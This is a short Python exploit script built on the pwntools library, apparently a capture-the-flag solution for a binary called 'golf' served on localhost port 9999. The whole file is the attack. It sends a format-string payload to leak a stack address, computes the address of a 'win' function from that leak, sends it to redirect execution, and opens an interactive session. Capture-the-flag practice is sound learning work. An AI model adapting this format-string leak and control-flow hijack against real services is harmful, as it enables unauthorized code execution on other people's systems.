from pwn import *
from pwn import p64

binary = ELF("./golf")
#conn = process(binary.path)
conn = remote("localhost", 9999)

exploit = "%171$p"
conn.sendline(exploit)
leaked_address = conn.recvuntil(b"\n\n").split()
leaked_address = leaked_address[-1].decode('UTF-8')

leaked_addr_int = int(leaked_address, 16)

win_addr = leaked_addr_int - 26
win_addr = hex(win_addr)

conn.sendline(win_addr)
conn.interactive()
